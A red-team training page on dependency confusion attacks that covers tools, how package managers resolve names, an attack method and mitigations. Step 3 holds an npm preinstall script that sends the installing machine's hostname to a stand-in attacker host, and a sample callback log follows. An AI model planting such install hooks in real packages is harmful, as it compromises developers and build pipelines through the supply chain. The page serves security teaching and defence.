---
layout: training-page
title: "Dependency Confusion — Red Team Academy"
module: "Web Hacking"
tags:
  - dependency-confusion
  - supply-chain
  - npm
  - pypi
  - package-managers
page_key: "web-dependency-confusion"
render_with_liquid: false
---

# Dependency Confusion

A dependency confusion attack (also called a supply chain substitution attack) tricks a package installer into pulling a malicious package from a public registry instead of the intended internal package with the same name. When a company uses private packages, an attacker who registers a public package with the same name — and a higher version number — may cause automated build systems to fetch the malicious package instead.

## Tools

- **confused** — Checks for dependency confusion vulnerabilities across npm, pip, gem, and other package managers — `github.com/visma-prodsec/confused`
- **DepFuzzer** — Finds dependency confusion or projects where owner's email can be taken over — `github.com/synacktiv/DepFuzzer`

## How It Works

Package managers like npm, pip, gem, and Maven resolve dependencies by searching both internal (private) and external (public) registries. When the public registry returns a package with a higher version number than the internal one, many package managers prefer the public version by default.

Affected ecosystems:

- **JavaScript / Node.js** (npm) — `package.json`
- **Python** (PyPI) — `requirements.txt`, `setup.py`, `pyproject.toml`
- **PHP** (Composer) — `composer.json`
- **Java** (Maven) — `pom.xml`
- **Docker** — `Dockerfile` image references

## Attack Methodology

### Step 1 — Enumerate Internal Package Names

Find private package names used by the target organization. Common sources:

- Public GitHub repositories — look at `package.json`, `requirements.txt`, `composer.json`, `pom.xml`
- Job postings that mention internal tooling
- JavaScript bundles in the application that reference internal module names
- npm `package-lock.json` or `yarn.lock` files that list resolved registry URLs
- Error pages or stack traces that leak package paths

### Step 2 — Check if the Package Name is Unclaimed on Public Registries

Search [npmjs.com](https://www.npmjs.com), PyPI, RubyGems, or other relevant public registries for the internal package name. If it is not registered, the attack surface exists.

### Step 3 — Register the Public Package with a Higher Version

Create a public package with:

- The same name as the internal private package
- A version number higher than the internal version (e.g., `9999.0.0`)
- A payload in `install` scripts or the package code itself that exfiltrates data (DNS callback with hostname, username, etc.)

Example npm package payload skeleton (for authorized bug bounty testing only):

```
# package.json
{
  "name": "internal-package-name",
  "version": "9999.0.0",
  "description": "Dependency confusion PoC",
  "scripts": {
    "preinstall": "node -e \"require('dns').lookup(require('os').hostname(),function(e,a){require('http').get('http://callback.attacker.com/?d='+a+'&h='+require('os').hostname())})\""
  }
}
```

### Step 4 — Wait for Execution

When a developer or CI/CD pipeline installs dependencies, the package manager may pull the malicious public package instead of the internal one. The `preinstall` script executes automatically during installation, sending a callback to the attacker's server.

## Detection Signals

In bug bounty context, the callback will include identifying information about the victim environment:

```
# Typical callback received by attacker
GET /?d=10.10.20.5&h=build-server-prod-01 HTTP/1.1
Host: callback.attacker.com
```

## Mitigations

- Use a private package registry (Artifactory, GitHub Packages, Azure Artifacts) configured as the sole source — do not fall back to public registries
- Pin exact package versions and use lock files (`package-lock.json`, `Pipfile.lock`)
- Use scoped packages in npm (`@company/package-name`) — scoped packages are harder to squatter
- Register your internal package names on public registries as placeholders (with no real code)
- Use tools like `confused` to audit your dependency manifests

## Resources

- confused — `github.com/visma-prodsec/confused`
- DepFuzzer — `github.com/synacktiv/DepFuzzer`
- Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies — Alex Birsan
- Exploiting Dependency Confusion — Aman Sapra (0xsapra)
- 3 Ways to Mitigate Risk When Using Private Package Feeds — Microsoft Azure
